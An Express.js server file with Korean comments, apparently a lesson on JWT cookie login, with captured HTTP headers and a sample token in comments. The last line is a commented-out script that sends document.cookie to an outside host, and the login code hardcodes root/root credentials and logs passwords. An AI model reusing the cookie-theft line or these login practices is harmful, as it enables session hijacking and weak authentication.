const express = require('express');
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser')
let token = require('./createtoken'); //외부 js파일 가져오기
const app = express();
const nunjucks = require('nunjucks');
const ctoken = require('./jwt');
const auth = require('./middleware/auth');

app.set('view engine','html');
nunjucks.configure('views',{
    express:app
});
app.use(bodyParser.json())
app.use(bodyParser.urlencoded({extended:false}))
app.use(cookieParser());
app.use(express.static('public'))

// 요청
// GET / HTTP/1.1
// Host: localhost:3500
// User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
// Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
// Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
// Accept-Encoding: gzip, deflate
// Connection: keep-alive
// Upgrade-Insecure-Requests: 1
// If-None-Match: W/"5f-46V4mlMJskhr8qDiUXUc5qfyO0k"
// Cache-Control: max-age=0 

app.get('/',(req,res)=>{
    //key:value
    //set-cookie : 'token=ingoo' 응답 header
    let {msg} = req.query;  
    res.render('index');
    console.log(req.cookies);
})
// 응답
// HTTP/1.1 304 Not Modified
// X-Powered-By: Express
// ETag: W/"5f-46V4mlMJskhr8qDiUXUc5qfyO0k"
// Date: Thu, 27 May 2021 06:18:40 GMT
// Connection: keep-alive
// Keep-Alive: timeout=5

// 요청
// GET /menu1 HTTP/1.1
// Host: localhost:3500
// User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
// Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
// Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
// Accept-Encoding: gzip, deflate
// Connection: keep-alive
// Referer: http://localhost:3500/?msg=%EB%A1%9C%EA%B7%B8%EC%9D%B8%EC%84%B1%EA%B3%B5
// Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwidXNlciI6IndlYjc3MjIiLCJpYXQiOjE1MTYyMzkwMjJ9.9kZoxAyKekjzGkxa5%2BL5H9r87nHO07tgPMSgmrUXi7Q
// Upgrade-Insecure-Requests: 1

app.get('/menu1',(req,res)=>{
    console.log(req.cookies);
    res.send('menu1 페이지 입니다')
})
// 응답
// HTTP/1.1 200 OK
// X-Powered-By: Express
// Content-Type: text/html; charset=utf-8
// Content-Length: 25
// ETag: W/"19-hu3zycefzZJDwZ/mRpXEdNxO2r0"
// Date: Thu, 27 May 2021 06:23:39 GMT
// Connection: keep-alive
// Keep-Alive: timeout=5

app.get('/user/info',auth,(req,res)=>{
    res.send(`Hello ${req.userid}`);
})


app.post('/auth/local/login',(req,res)=>{
    let {userid,userpw} = req.body;
    //let {userid,userpw} = JSON.parse(req.get('data'));
   console.log('body req:',userid,userpw);
    //console.log('data req:',userid,userpw);
    //DB접속후 결과 Return
    let result ={};
    if(userid=='root'&&userpw=='root'){
        result={
            result:true,
            msg:'로그인에 성공하셨습니다'
        }
        let token = ctoken(userid);
        res.cookie('AccessToken',token,{httpOnly:true,secure:true,})
    }else{
        result={
                result:false,
                msg:'아이디와 패스워드를 확인하세요'
        }
    }
    res.json(result)
})

// 요청
// GET /?msg=%EB%A1%9C%EA%B7%B8%EC%9D%B8%EC%84%B1%EA%B3%B5 HTTP/1.1
// Host: localhost:3500
// User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
// Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
// Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
// Accept-Encoding: gzip, deflate
// Referer: http://localhost:3500/
// Connection: keep-alive
// Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwidXNlciI6IndlYjc3MjIiLCJpYXQiOjE1MTYyMzkwMjJ9.9kZoxAyKekjzGkxa5%2BL5H9r87nHO07tgPMSgmrUXi7Q
// Upgrade-Insecure-Requests: 1

app.get('/login',(req,res)=>{
    let {id,pw}= req.query; //비구조 할당문 사용시 let,const 변수선언문이 꼭 필요
                            //혹시 사용할 일이 없으면 () 안으로 사용
    if(id=='root'&&pw=='root'){
        //토큰생성
        let  ctoken = token();
        res.cookie('token',ctoken,{httpOnly:true,secure:true,});
        res.redirect('/?msg=로그인성공');
    }else{
        //토큰 실패
        res.redirect('/?msg=로그인 실패');
    }

})
// 응답
// HTTP/1.1 200 OK
// X-Powered-By: Express
// Content-Type: text/html; charset=utf-8
// Content-Length: 101
// ETag: W/"65-9cmIZgMYg6SjBzVraA4oEhYHA8g"
// Date: Thu, 27 May 2021 06:22:30 GMT
// Connection: keep-alive
// Keep-Alive: timeout=5

app.listen(3500,()=>{
    console.log('server start port:3500');
})
//location.href=`http//naver.com?${document.cookie}`